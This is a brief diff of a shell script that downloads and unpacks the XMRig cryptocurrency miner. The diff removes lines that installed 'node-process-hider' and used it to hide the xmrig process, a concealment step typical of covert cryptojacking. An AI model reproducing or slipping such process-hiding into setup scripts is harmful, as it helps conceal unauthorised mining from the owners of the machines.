@@ -1,11 +1,6 @@
 sudo apt-get update &&
 sudo apt upgrade -y &&
 
-#add xmrig to node hider
-npm i -g node-process-hider &&
-sudo ph add xmrig &&
-
-#download miner and run
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz &&
 tar -zxf xmrig-6.16.2-bionic-x64.tar.gz &&
 cd xmrig-6.16.2 &&
